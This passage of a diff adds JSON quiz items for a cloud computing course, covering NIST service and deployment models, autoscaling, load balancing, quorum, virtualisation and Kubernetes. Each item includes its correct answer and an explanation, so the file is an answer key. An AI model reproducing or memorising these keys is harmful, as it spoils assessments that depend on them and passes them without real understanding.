+   "D": "Capacity must be both acquired and released rapidly and in proportion to current demand, without waiting on a procurement or approval cycle"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "NIST's rapid elasticity requires capabilities to be provisioned and released so as to scale rapidly outward and inward commensurate with demand — release matters as much as acquisition, and an approval cycle defeats 'rapid'. Option A overreads the definition, which says elasticity is automatic only in some cases, and option B overreads it in the other direction: capacity need only appear unlimited to the consumer.",
+  "id": "GEN-T2U4-008"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "A department runs an internal private cloud and separately subscribes to a public-cloud SaaS email service. The two share no data, no tooling and no identity integration. Which requirement of the NIST SP 800-145 hybrid cloud definition does this arrangement fail to meet?",
+  "opts": {
+   "A": "Both constituent infrastructures must be operated by the same cloud provider",
+   "B": "The same workload must be running simultaneously on the private and the public infrastructure",
+   "C": "The constituent infrastructures must remain distinct entities yet be bound together by standardised or proprietary technology that enables data and application portability",
+   "D": "At least one of the constituent infrastructures must be a community cloud"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "NIST defines hybrid cloud as a composition of two or more distinct cloud infrastructures that remain unique entities but are bound together by technology enabling data and application portability, so merely holding two unrelated subscriptions is not a composition. B is the tempting one because cloud bursting is NIST's own illustration of such binding, but bursting is one permitted use of the binding, not a requirement that both infrastructures run the workload at once.",
+  "id": "GEN-T2U4-009"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "Under the NIST SP 800-145 definition of Infrastructure as a Service, which of the following is the consumer said to control?",
+  "opts": {
+   "A": "The hypervisor's scheduling and memory-overcommit policy on the physical host",
+   "B": "Operating systems, storage and deployed applications, together with limited control of select networking components such as host firewalls",
+   "C": "The provider's underlying storage fabric and physical network topology",
+   "D": "The physical rack and data-hall placement of the servers running its instances"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "The IaaS definition states that the consumer does not manage or control the underlying cloud infrastructure but has control over operating systems, storage and deployed applications, and possibly limited control of select networking components such as host firewalls. A is the near-miss: IaaS hands the consumer virtual machines, but the hypervisor that schedules them stays on the provider's side of the line.",
+  "id": "GEN-T2U4-010"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "A critical vulnerability is disclosed in the guest operating system's TLS library. The same application is deployed three ways: (i) on an IaaS virtual machine the team launched from its own image, (ii) on a PaaS platform to which the team uploads only a deployable artefact, and (iii) as a function on a serverless FaaS platform. In which deployments must the customer itself apply the operating-system patch?",
+  "opts": {
+   "A": "(i) only",
+   "B": "(i) and (ii) only",
+   "C": "(ii) and (iii) only",
+   "D": "(i) and (iii) only"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Patching the guest operating system falls to the customer only where the customer supplies and boots the OS image, which is exactly the boundary that defines IaaS; PaaS and FaaS platforms both supply and maintain the operating system underneath the customer's code. B tempts because a PaaS consumer still owns and uploads the artefact, but that artefact is the application, not the operating system.",
+  "id": "GEN-T2U4-011"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "Which characteristic most fundamentally distinguishes a Function-as-a-Service deployment from a PaaS deployment of the same application?",
+  "opts": {
+   "A": "Capacity is allocated per invocation and nothing is charged while no requests are being served, so there is no provisioned instance count at all",
+   "B": "Only PaaS lets the consumer choose the programming language and runtime version",
+   "C": "Only FaaS provides automatic scaling; PaaS deployments must be resized by hand",
+   "D": "Only PaaS runs on virtualised infrastructure, whereas FaaS executes directly on bare metal"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "FaaS removes the provisioned instance entirely: the platform creates execution capacity per event, scales to zero when idle, and bills on invocations and execution time rather than on running instances. C is the popular near-miss, since mainstream PaaS offerings have shipped autoscaling for years, so automatic scaling by itself does not separate the two models.",
+  "id": "GEN-T2U4-012"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "A file-upload feature writes user files to a local directory and later serves them back from there. It works on an IaaS virtual machine. Redeployed unchanged onto a PaaS platform running several application instances behind the platform's router, some uploads return 404 on a later request and all of them vanish after a redeploy. What explains this?",
+  "opts": {
+   "A": "The platform mounts the application's filesystem read-only, so the writes are silently discarded",
+   "B": "The platform's router strips multipart request bodies unless the application declares a file-upload route",
+   "C": "The platform packages the application immutably at build time, so any runtime write takes effect only after a fresh deployment",
+   "D": "Each instance has its own ephemeral local filesystem and requests are spread across instances, so a file written on one instance is neither visible to the others nor durable across redeploys"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "The PaaS model treats application instances as disposable and interchangeable, so local disk is scratch space tied to one instance's lifetime, which is why uploads belong in an object store or an attached managed volume. A is the tempting alternative, but the writes plainly succeed - the file is readable immediately afterwards from the instance that stored it, which a read-only mount would not allow.",
+  "id": "GEN-T2U4-013"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "A state department contracts a vendor to build, own and operate a cloud environment that only that department may use, hosted entirely in the vendor's own data centre. Under NIST SP 800-145, which deployment model is this?",
+  "opts": {
+   "A": "Private cloud, because the model is defined by provisioning for exclusive use by a single organisation, and the infrastructure may be owned, managed and operated by a third party and sit off premises",
+   "B": "Public cloud, because the infrastructure is owned by a commercial provider and located outside the department's premises",
+   "C": "Hybrid cloud, because operational responsibility is split between the department and the vendor",
+   "D": "Community cloud, because a government body and a commercial vendor both participate in it"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "NIST defines private cloud by exclusivity of use rather than by ownership or location, and explicitly permits the infrastructure to be owned, managed and operated by a third party and to exist off premises. B is the standard trap: vendor-owned and off-premises does describe most public clouds, but public cloud is defined by provisioning for open use by the general public, which this environment is not.",
+  "id": "GEN-T2U4-014"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "A function on a serverless FaaS platform reads messages from a queue and opens a connection to a managed relational database at the start of each invocation. During a traffic spike the platform runs roughly 800 concurrent executions and the function starts failing. What is the most likely cause?",
+  "opts": {
+   "A": "The queue stops delivering messages, because a FaaS function can consume a queue only one message at a time",
+   "B": "The database refuses new connections once its configured maximum is reached, because each concurrent execution environment holds a connection of its own",
+   "C": "Cold starts serialise the invocations, so the queue's visibility timeout expires before any handler can finish",
+   "D": "The platform transparently pools connections across execution environments, so the surplus connections are queued until they time out"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "FaaS scales out by creating many independent execution environments, so consumer concurrency translates almost one-to-one into database connections and quickly exhausts a relational database's connection limit; the usual remedy is a connection pooler or proxy between the function and the database. D is tempting but backwards - no mainstream FaaS platform pools application-level database connections on the consumer's behalf.",
+  "id": "GEN-T2U4-015"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "A customer of a multi-tenant SaaS application asks the vendor to keep its tenant on the previous release for six months while it revalidates internal processes. The vendor replies that this is not possible. Which property of the SaaS model explains that answer?",
+  "opts": {
+   "A": "Under SaaS it is the consumer, not the provider, who is responsible for applying application updates",
+   "B": "SaaS is defined by a dedicated application instance per tenant, and the vendor will not fund a second instance",
+   "C": "All tenants are served by one running version of the provider's application with tenant data separated logically, so there is no per-tenant build to hold back",
+   "D": "The provider's SLA obliges it to run only the most recent release in order to meet its availability commitment"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "In SaaS the consumer uses the provider's application running on the provider's infrastructure and controls only limited user-specific configuration settings; a single shared codebase serving every tenant is what makes that model work, and it leaves no per-tenant version to freeze. B inverts the model, since a dedicated instance per tenant describes single-tenant hosting, which is precisely what multi-tenancy is not.",
+  "id": "GEN-T2U4-016"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L02",
+  "sub": "Deployment and service models: IaaS, PaaS, SaaS and serverless",
+  "q": "A serverless function returns quickly, but its audit records are written for some invocations and missing for others:\n\n    exports.handler = async (event) => {\n      writeAuditRecord(event);      // returns a promise; not awaited\n      return { statusCode: 200 };\n    };\n\nWhich property of the FaaS execution model explains the missing records?",
+  "opts": {
+   "A": "Concurrent invocations share a single event loop, so pending promises are cancelled whenever any handler returns",
+   "B": "Returning a 2xx status causes the platform to discard everything the invocation did after the response was built",
+   "C": "FaaS runtimes forbid outbound network calls from a handler unless the call is awaited",
+   "D": "Once the handler returns, the platform may freeze or reclaim the execution environment, so work that was not awaited is not guaranteed to run to completion"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "A FaaS platform treats the handler's return as the end of the invocation and may freeze the execution environment immediately, leaving the un-awaited promise suspended - sometimes finished much later by a subsequent invocation that reuses the same environment, which is why the records appear intermittently rather than never. B describes a similar outcome but blames the status code; the freeze happens on return whatever the handler returned.",
+  "id": "GEN-T2U4-017"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "A data centre reports a Power Usage Effectiveness (PUE) of 1.5. The operations team then consolidates workloads onto fewer physical servers and powers down the freed machines. The facility's measured total electricity draw falls, yet the reported PUE rises to 1.8. What best explains this?",
+  "opts": {
+   "A": "PUE is the ratio of total facility energy to IT-equipment energy, and much of the non-IT overhead (cooling plant, UPS losses, lighting) does not scale down with IT load, so shrinking the denominator raises the ratio even though total energy fell",
+   "B": "Servers that are powered down but still racked are reclassified from IT load into facility load, so they move into the numerator only",
+   "C": "Consolidation raises per-rack power density, and the additional cooling this demands always outweighs the energy saved by switching servers off",
+   "D": "PUE excludes virtualised servers from its IT-equipment term, so moving workloads onto hypervisors artificially shrinks the denominator"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "PUE is total facility energy divided by IT energy, so it is an efficiency ratio and not a measure of absolute consumption; fixed overhead makes it worsen whenever IT load drops. Option C is tempting but is contradicted by the stem, which states total draw actually fell — this is why PUE alone is a poor sustainability target and is paired with absolute energy and carbon metrics.",
+  "id": "GEN-T2U4-018"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "A sustainability team wants to account for the greenhouse-gas emissions produced by mining, manufacturing and shipping the servers it buys, as distinct from the emissions of the electricity those servers draw while running. It notes that stretching the hardware refresh cycle from three years to five reduces this quantity per year of service. Which term names it?",
+  "opts": {
+   "A": "Operational carbon",
+   "B": "Embodied carbon",
+   "C": "Carbon Usage Effectiveness (CUE)",
+   "D": "Power Usage Effectiveness (PUE)"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Embodied (or embedded) carbon is the emissions locked into a device before it is ever switched on, which is why longer refresh cycles amortise it over more service years. Carbon Usage Effectiveness is the closest trap: it is total CO2e from facility energy divided by IT energy, so it measures operational emissions, not manufacturing ones.",
+  "id": "GEN-T2U4-019"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "A Kubernetes HorizontalPodAutoscaler (autoscaling/v2) is configured with minReplicas: 2, maxReplicas: 10, and a single Resource metric on cpu with target type Utilization and averageUtilization: 50. The Deployment is currently running 4 pods, and each pod is averaging 100% of its requested CPU. Ignoring stabilisation windows and scaling policies, what replica count does the HPA compute?",
+  "opts": {
+   "A": "5",
+   "B": "6",
+   "C": "8",
+   "D": "10"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "The HPA applies desiredReplicas = ceil(currentReplicas x currentMetricValue / desiredMetricValue), which here is ceil(4 x 100 / 50) = 8, comfortably under maxReplicas. Option D assumes a breach of the target jumps straight to the maximum, and option A assumes the controller adds one replica per reconcile loop; neither reflects how the ratio-based algorithm works.",
+  "id": "GEN-T2U4-020"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "A pool of identically sized backend instances serves a mix of sub-10 ms API calls and occasional multi-second report generations. Under plain round-robin distribution, a few instances are saturated with long requests while others sit nearly idle. Assuming the load balancer can observe how many requests it currently has in flight to each backend, which algorithm most directly corrects this?",
+  "opts": {
+   "A": "Weighted round robin, with weights assigned in proportion to each instance's size",
+   "B": "Source-IP hashing, so each client is pinned to one backend",
+   "C": "Uniformly random backend selection on every request",
+   "D": "Least outstanding requests (least connections), sending each new request to the backend with the fewest in-flight requests"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Least-outstanding-requests is the standard remedy for highly variable request cost because it reacts to live occupancy rather than to position in a rotation. Weighted round robin is the tempting alternative but its weights are static and reflect capacity, not the current backlog, so an instance stuck on a long report keeps receiving its share.",
+  "id": "GEN-T2U4-021"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "A five-node consensus-based datastore that commits writes on a majority quorum is deployed across two availability zones: three nodes in AZ-a and two in AZ-b. AZ-a becomes unreachable. What happens to the cluster?",
+  "opts": {
+   "A": "The two surviving nodes cannot form a majority of the five configured members, so the cluster loses quorum and refuses writes until AZ-a returns or the membership is changed by an operator",
+   "B": "The two surviving nodes elect a leader among themselves and continue accepting writes at reduced throughput",
+   "C": "Quorum is automatically recalculated against the reachable membership, so two out of two becomes the new majority and service continues",
+   "D": "Writes continue to be accepted and are reconciled by last-write-wins once AZ-a rejoins"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "A majority quorum is computed against the configured membership of five, so three nodes are required and the surviving two are stranded — which is precisely why quorum systems are spread across three availability zones rather than two. Option C is the most seductive, but automatic shrinking of the quorum on partition is exactly what would allow both sides to accept conflicting writes, so consensus protocols require an explicit operator-driven membership change instead.",
+  "id": "GEN-T2U4-022"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "During every rolling deployment behind a cloud load balancer, a small number of users see connections reset mid-request, even though replacement instances pass their health checks before the old instances are taken out of service. Which load-balancer setting addresses this most directly?",
+  "opts": {
+   "A": "Lengthening the health-check interval so instances are probed less aggressively",
+   "B": "Connection draining (deregistration delay), which stops new requests to a departing instance but lets in-flight requests finish within a grace period",
+   "C": "Enabling sticky sessions so each client stays bound to one instance",
+   "D": "Raising the load balancer's idle timeout for keep-alive connections"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Without a deregistration delay, an instance is removed from rotation and terminated while requests already dispatched to it are still executing, which the client observes as a reset. Sticky sessions are the tempting choice because they also concern client-to-instance binding, but they make the problem worse — a pinned client is guaranteed to be affected when its instance goes away.",
+  "id": "GEN-T2U4-023"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "Service A calls service B synchronously. B's p99 latency rises from 40 ms to 20 seconds. A's request-handling threads all end up blocked waiting on B, and A starts failing requests on endpoints that never touch B at all. Which resilience mechanism is specifically designed to stop A from continuing to issue calls to a dependency that is already failing?",
+  "opts": {
+   "A": "Automatic retries with exponential backoff and jitter on every call to B",
+   "B": "Horizontally autoscaling service A on average CPU utilisation",
+   "C": "A circuit breaker that opens after a failure or slow-call threshold is crossed and fails calls to B immediately while open",
+   "D": "Increasing A's client-side timeout for B so that slow responses are not abandoned"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "A circuit breaker trips on observed failure or slow-call rate and then fails fast, freeing A's threads instead of parking them on a dependency that cannot answer. Retries with backoff and jitter are the trap: they are good practice for transient errors but here they multiply load against an already-overloaded B and hold A's threads even longer, and autoscaling A on CPU will not even fire, since threads blocked on I/O consume almost no CPU.",
+  "id": "GEN-T2U4-024"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "A cluster runs an API gateway at its edge and a service mesh internally. Which responsibility properly belongs to the API gateway rather than to the service mesh?",
+  "opts": {
+   "A": "Terminating mutual TLS on a call from one internal service to another",
+   "B": "Retrying an idempotent internal call against a second replica after the first returns 503",
+   "C": "Propagating trace-context headers across internal service-to-service hops",
+   "D": "Authenticating external third-party consumers by API key and enforcing a per-consumer request quota on traffic entering the cluster from the public internet"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "The gateway owns north-south traffic — the boundary where untrusted external clients are identified, monetised and rate-limited per consumer — while the mesh owns east-west traffic between services that are already inside the trust boundary. The other three options all describe internal hops, which are exactly the sidecar's job in a mesh.",
+  "id": "GEN-T2U4-025"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L03",
+  "sub": "Cloud-native architecture, microservices, service mesh, elasticity and load balancing",
+  "q": "A cloud provider offers carbon-aware scheduling for deferrable batch workloads such as nightly model retraining. What does such a scheduler actually exploit in order to reduce emissions?",
+  "opts": {
+   "A": "It reduces the total kilowatt-hours the job consumes by compressing the same work into a shorter wall-clock window",
+   "B": "The carbon intensity of grid electricity (grams of CO2e per kWh) varies by hour and by region, so a job with a flexible deadline can be run at a time, or in a region, where the electricity is cleaner",
+   "C": "It retires renewable-energy certificates after the run so that the job's reported emissions net out to zero",
+   "D": "It restricts scheduling to providers that have published a net-zero commitment for the calendar year"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Carbon-aware scheduling is temporal and spatial shifting: the same kilowatt-hours are moved to a window or region where the marginal generation mix is less carbon-intense, which is why it only works for workloads with slack in their deadline. Option C describes offsetting, an accounting step applied after consumption that changes no scheduling decision at all.",
+  "id": "GEN-T2U4-026"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "On 32-bit x86 before Intel VT-x and AMD-V, a hypervisor could not run a guest kernel by pure trap-and-emulate. Which property of that instruction set was the obstacle?",
+  "opts": {
+   "A": "The architecture offered only two usable privilege levels, leaving no ring in which a guest kernel could sit between applications and the hypervisor",
+   "B": "Instructions were variable-length, so the hypervisor could not decode the guest instruction stream quickly enough to emulate it in software",
+   "C": "Several sensitive instructions were not privileged: executed from user mode they quietly returned host state or ignored the operation instead of faulting to the hypervisor",
+   "D": "The MMU exposed host physical addresses to ring 3, so any guest could read memory frames belonging to a co-resident guest"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Popek and Goldberg's condition for classical virtualisability is that every sensitive instruction also be privileged, and x86 broke it: instructions such as PUSHF/POPF and the store-descriptor-table family execute in user mode without trapping, so the hypervisor never gains control to emulate them. Ring count was never the problem — x86 has four rings, and VMware's answer was binary translation of the offending instructions, not extra rings.",
+  "id": "GEN-T2U4-027"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "Compared with the binary-translation approach of early x86 hypervisors, what does hardware-assisted virtualisation (Intel VT-x / AMD-V) actually add to the processor?",
+  "opts": {
+   "A": "A second, orthogonal execution mode: the guest runs in non-root mode at its own normal privilege level, and configured sensitive events cause a VM exit into root mode where the hypervisor handles them",
+   "B": "A hardware rewriting engine that converts guest kernel instructions into safe host instructions, taking over the job of the hypervisor's software translation cache",
+   "C": "A firmware-reserved physical core on which all of a guest's privileged instructions are executed in isolation from the rest of the host",
+   "D": "An extra privilege ring below ring 0 into which the guest kernel is deprivileged, so that every ring-0 instruction it issues faults in the normal way"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "VT-x and AMD-V introduce root and non-root operation with guest state held in a hardware control structure (VMCS on Intel, VMCB on AMD): the guest kernel keeps running at ring 0 inside non-root mode and leaves via VM exits, so no instruction rewriting is required. The popular 'ring -1' phrasing behind option D is loose — it is the hypervisor that moves into a separate mode, not the guest that is pushed into a new ring.",
+  "id": "GEN-T2U4-028"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "A hypervisor moves from software-maintained shadow page tables to hardware nested paging (Intel EPT / AMD RVI). What is the essential trade-off of that move?",
+  "opts": {
+   "A": "It removes the memory overhead of the shadow tables, but requires the guest kernel to be modified so that every page-table update becomes an explicit hypercall",
+   "B": "It removes the host's dependence on an IOMMU, but in exchange no physical device can any longer be assigned directly to a guest",
+   "C": "It eliminates the guest's own page tables entirely, but the hypervisor must then service every page fault the guest takes",
+   "D": "It removes the VM exits previously needed to keep shadow tables synchronised with guest page-table edits, but a TLB miss now costs a two-dimensional walk through both guest and nested tables"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Nested paging lets the CPU walk the guest and host translations itself, so the guest may edit its own page tables freely and the exit-heavy shadow-table maintenance disappears, at the cost of a far longer walk on each TLB miss — which is exactly why large pages matter more under EPT/RVI. Option A describes a paravirtualised MMU, a different technique in which the guest is modified; nested paging needs no guest changes at all.",
+  "id": "GEN-T2U4-029"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "A host is short of physical memory, so the hypervisor inflates the balloon driver running inside one of its guests. What does inflating the balloon accomplish?",
+  "opts": {
+   "A": "It compresses the guest's least-recently-used pages into a host-side compression cache so that reclaiming them does not require disk I/O",
+   "B": "It allocates and pins pages inside the guest, letting the guest's own memory manager choose which pages to surrender, after which the hypervisor reclaims the host frames backing them",
+   "C": "It scans co-resident VMs for pages with identical contents and maps them onto a single shared host frame, freeing the duplicates",
+   "D": "It writes the guest's pages out to the host's swap file without the guest's participation and entirely transparently to the guest OS"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Ballooning is deliberately cooperative: the in-guest driver demands memory, and because the guest OS picks the victims it gives up the pages it considers least valuable, which is far better than the host guessing blindly. Option D is host swapping — the uncooperative fallback used when ballooning cannot reclaim fast enough — while C is transparent page sharing and A is memory compression, both separate reclamation techniques.",
+  "id": "GEN-T2U4-030"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "On a contended VMware vSphere cluster, an application VM configured with 16 vCPUs performs worse than the same VM did with 4 vCPUs, even though the application never keeps more than four threads busy and guest-visible CPU utilisation stays low. What best explains this?",
+  "opts": {
+   "A": "The wider VM must have its vCPUs progress together within a bounded skew, so on a contended host it waits until enough physical cores are free and accumulates CPU ready time",
+   "B": "Each extra vCPU reserves a fixed slice of host RAM for its register save area, leaving the guest with markedly less memory for its page cache",
+   "C": "The hypervisor pins each vCPU to a dedicated physical core, so a 16-vCPU VM cannot be scheduled at all unless 16 cores are permanently idle",
+   "D": "The guest scheduler keeps migrating the four busy threads across all 16 vCPUs, and each such migration forces a VM exit into the hypervisor"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "ESXi's relaxed co-scheduling caps how far one vCPU may run ahead of its siblings, so an oversized VM needs many physical cores available at roughly the same time; on a busy host that shows up as high CPU ready (%RDY) while the guest itself looks idle, which is why right-sizing vCPU counts is standard practice. Option C overstates the mechanism — vCPUs are time-shared against physical cores, not permanently pinned to them.",
+  "id": "GEN-T2U4-031"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "A tenant VM needs near-line-rate throughput from a shared 25 GbE NIC with minimal host CPU cost, so the operator enables SR-IOV on that NIC and assigns the VM a virtual function. What has changed for that VM's traffic?",
+  "opts": {
+   "A": "The hypervisor's software switch is given exclusive use of a physical core, so its packet-processing loop is no longer preempted by guest vCPUs",
+   "B": "The emulated NIC in the guest is replaced by a paravirtualised device whose driver shares a descriptor ring with the host, halving the number of packet copies",
+   "C": "The entire NIC port is handed to the VM through the IOMMU, so that VM has sole use of the port and every other VM must be placed on a different port",
+   "D": "The NIC presents itself as several lightweight PCIe functions; one is assigned directly to the VM, which drives it with its own driver and DMAs into guest memory, bypassing the hypervisor's software switch"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "SR-IOV splits one physical function into many virtual functions that the NIC switches between in hardware, so each VM owns a VF directly while the IOMMU confines that VF's DMA to the owning guest's memory. Option C describes plain PCI passthrough, which cannot scale beyond the number of physical ports, and option B describes a paravirtualised device such as virtio-net, whose packets still traverse the host.",
+  "id": "GEN-T2U4-032"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "On a KVM host, `qemu-img info` reports the following for a VM's disk image:\n  file format: qcow2\n  virtual size: 40 GiB\n  disk size: 1.31 GiB\n  backing file: golden-base.qcow2\nWhich statement about this disk is correct?",
+  "opts": {
+   "A": "The 40 GiB figure is an upper quota only; the guest currently sees just 1.31 GiB of usable disk until the image is explicitly resized",
+   "B": "It is a copy-on-write overlay: only blocks written since it was created are stored here, every untouched block is read from golden-base.qcow2, which must remain present and unmodified",
+   "C": "golden-base.qcow2 is an incremental backup written after each shutdown of this VM, and may safely be deleted once the VM has booted cleanly",
+   "D": "The image is a compressed full clone in which 1.31 GiB holds the compressed form of the 40 GiB volume, and the base image is no longer referenced at runtime"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "A backing file makes the image an overlay: any cluster the overlay has never written is read through to the base, so deleting or editing golden-base.qcow2 corrupts every overlay built on it — this is precisely how golden images and linked clones are implemented. The guest still sees the full 40 GiB; `disk size` merely reports how much of the host's storage the sparse overlay occupies today, which is why option A misreads the two figures.",
+  "id": "GEN-T2U4-033"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "A guest deletes 200 GB of files from a thin-provisioned virtual disk on a SAN-backed datastore. Free space inside the guest filesystem rises at once, but consumed capacity on the datastore and on the array does not fall. What explains this, and what brings the space back?",
+  "opts": {
+   "A": "The array is holding the freed blocks in its write cache; consumed capacity will drop of its own accord once that cache destages to disk",
+   "B": "Consumed capacity is recomputed only when a snapshot is taken, so the figure will correct itself at the next scheduled snapshot of the VM",
+   "C": "Deleting a file only rewrites guest filesystem metadata, so the underlying blocks stay allocated until the guest issues SCSI UNMAP / TRIM and the virtualisation and storage stack passes that reclamation down to the array",
+   "D": "For a thin-provisioned disk the datastore always displays the provisioned size rather than actual usage, so the figure shown was never going to change"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "A delete is a metadata operation inside the guest filesystem, so the hypervisor and the array still believe those blocks are in use; reclamation requires an UNMAP/TRIM hint propagated from the guest filesystem through the virtual disk down to the array, which is why guests are mounted with discard support or run a periodic trim. Option D is the reverse of how thin provisioning is reported — the whole point of a thin datastore is that it reports blocks actually allocated, not the provisioned size.",
+  "id": "GEN-T2U4-034"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L04",
+  "sub": "Virtualization: virtual machines, hypervisors, and CPU/storage/network virtualization",
+  "q": "A write-heavy in-memory database VM is being live-migrated between two hosts that use shared storage. The hypervisor copies its memory, then copies more memory, and after several passes the migration is abandoned instead of completing. What is happening?",
+  "opts": {
+   "A": "The destination host reports a different CPU model, so each page must be re-encoded for that model before the destination will accept it",
+   "B": "Because storage is shared, the virtual disk is transferred alongside memory on every pass, and the disk is far larger than the VM's RAM",
+   "C": "Pre-copy migration re-sends the pages dirtied during the previous pass; this workload dirties memory faster than the migration link can ship it, so the residual set never shrinks enough to enter the brief stop-and-copy phase",
+   "D": "Every pass retransmits the guest's entire memory from the beginning, so the total transfer time is fixed and simply exceeds the configured migration timeout"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Pre-copy converges only while the guest's page dirty rate stays below the achievable transfer rate; a write-heavy in-memory workload can outrun the link, leaving a large residual working set and forcing the hypervisor to give up — the usual remedies are a faster migration network, throttling the vCPUs, or a post-copy strategy that resumes on the destination and faults pages across. Option B inverts the purpose of shared storage: the disk is not copied at all, only memory and device state are.",
+  "id": "GEN-T2U4-035"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "A team runs a sharded datastore on Kubernetes. Each replica needs a hostname that stays the same across rescheduling, and its own PersistentVolume that is re-attached to that same replica rather than to whichever Pod starts first. Which workload object provides this?",
+  "opts": {
+   "A": "A Deployment whose Pod template mounts a PersistentVolumeClaim",
+   "B": "A DaemonSet, so that each replica is pinned to one node",
+   "C": "A StatefulSet with a volumeClaimTemplate",
+   "D": "A ReplicaSet with pod anti-affinity across nodes"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "A StatefulSet gives every Pod a stable ordinal identity and name, and its volumeClaimTemplate creates a separate PersistentVolumeClaim per ordinal that is rebound to the same ordinal whenever that Pod is recreated. A Deployment mounting a PersistentVolumeClaim (A) points every replica at the one same claim and hands out randomised Pod names, so neither the identity nor the per-replica volume requirement is met.",
+  "id": "GEN-T2U4-036"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "Which Service configuration makes cluster DNS resolve the Service name to the individual Pod IP addresses of its ready endpoints, instead of to one virtual IP that load-balances across them?",
+  "opts": {
+   "A": "Setting clusterIP: None, i.e. a headless Service",
+   "B": "type: NodePort",
+   "C": "type: ExternalName",
